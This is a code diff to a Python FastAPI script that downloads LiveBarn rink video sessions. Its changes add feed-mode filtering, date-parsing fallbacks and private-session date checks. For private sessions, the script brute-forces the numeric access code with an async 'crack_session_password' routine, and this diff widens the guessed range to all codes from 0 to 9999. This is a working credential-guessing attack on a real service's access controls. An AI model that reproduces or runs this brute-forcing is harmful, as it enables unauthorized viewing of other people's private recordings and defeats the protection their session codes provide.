@@ -8,7 +8,6 @@ import datetime
 import asyncio
 import aiohttp
 import json
-import os
 import subprocess
 
 url = "https://webapi.livebarn.com/api/v2.0.0"
@@ -28,9 +27,10 @@ def check_private_session(session, headers, date, time, surface_id):
     if private_sessions.status_code == 200:
         for private_session in private_sessions.json():
             private_session_start_date = datetime.datetime.strptime(private_session["startDateTimeStr"], "%Y-%m-%dT%H:%M")
-            private_session_end_time = datetime.datetime.strptime(private_session["endDateTimeStr"], "%Y-%m-%dT%H:%M")
-            if str(private_session_start_date.date()) == date:
-                if private_session_end_time.time() >= datetime.datetime.strptime(time, "%H:%M").time() >= private_session_start_date.time():
+            private_session_end_date = datetime.datetime.strptime(private_session["endDateTimeStr"], "%Y-%m-%dT%H:%M")
+
+            if private_session_end_date.date() >= datetime.datetime.strptime(date, "%Y-%m-%d").date() >= private_session_start_date.date():
+                if private_session_end_date.time() >= datetime.datetime.strptime(time, "%H:%M").time() >= private_session_start_date.time():
                     return True
         else:
             return False
@@ -55,15 +55,16 @@ async def crack_session_password(headers, url, chunk):
                 pass
         return results
 
-def get_session_details(session, headers, session_url, code=None):
+def get_session_details(session, headers, session_url, feed_mode, code=None):
     if code is None:
         response = session.get(session_url, headers=headers)
     else:
         response = session.get(session_url + f"/code/{code}", headers=headers)
     if response.status_code == 200:
-        if not response.json():
+        sessions = [session for session in response.json() if session["feedModeId"] == int(feed_mode)]
+        if not sessions:
             raise HTTPException(status_code=400, detail="No sessions found")
-        session_details = response.json()[0]
+        session_details = sessions[0]
     else:
         raise HTTPException(status_code=response.status_code, detail=response.text)
     return session_details
@@ -97,14 +98,17 @@ def get_surface_sessions(surface_id: Annotated[str, Depends(has_surface_id)], ac
     if sessions.status_code == 200:
         for session in sessions.json():
             begin_date_str = session["beginDate"].replace(session["beginDate"].split("-")[-1], "")[:-1]
-            begin_date = datetime.datetime.strptime(begin_date_str, "%Y-%m-%dT%H:%M:%S.%f")
+            try:
+                begin_date = datetime.datetime.strptime(begin_date_str, "%Y-%m-%dT%H:%M:%S.%f")
+            except ValueError:
+                begin_date = datetime.datetime.strptime(begin_date_str, "%Y-%m-%dT%H:%M:%S")
             end_date = begin_date + datetime.timedelta(seconds=session["duration"] / 1000)
             for possible_time in possible_times:
                 if end_date >= datetime.datetime.strptime(f"{date}T{possible_time}", "%Y-%m-%dT%H:%M") >= begin_date:
                     session["beginTime"] = possible_time
                     formatted_sessions.append(session)
                     break
-        return formatted_sessions
+        return JSONResponse(status_code=200, content=formatted_sessions)
     else:
         raise HTTPException(status_code=sessions.status_code, detail=sessions.text)
 
@@ -121,17 +125,18 @@ def create_surface_session_download(access_token: Annotated[str, Depends(has_acc
         is_private_session = check_private_session(session=session, headers=headers, date=date, time=time, surface_id=surface_id)
         session_url = f"{url}/media/surfaceid/{surface_id}/feedmodeid/{feed_mode}/begindate/{date}T{time}"
         if not is_private_session:
-            session_details = get_session_details(session=session, headers=headers, session_url=session_url)
+            session_details = get_session_details(session=session, headers=headers, session_url=session_url, feed_mode=feed_mode)
         else:
-            chunks = list(divide_chunks(l=[x for x in range(6000, 10000)], n=1000))
+            chunks = list(divide_chunks(l=[x for x in range(0, 10000)], n=1000))
             for index, chunk in enumerate(chunks):
                 for index, result in enumerate(asyncio.run(crack_session_password(headers=headers, url=session_url, chunk=chunk))):
                     try:
                         if "url" in result[0]:
                             code = str(int(chunk[0]) + int(index))
-                            session_details = get_session_details(session=session, headers=headers, session_url=session_url, code=code)
+                            session_details = get_session_details(session=session, headers=headers, session_url=session_url, feed_mode=feed_mode, code=code)
                             break
                     except TypeError as e:
+                        print(str(e))
                         pass
                 else:
                     continue
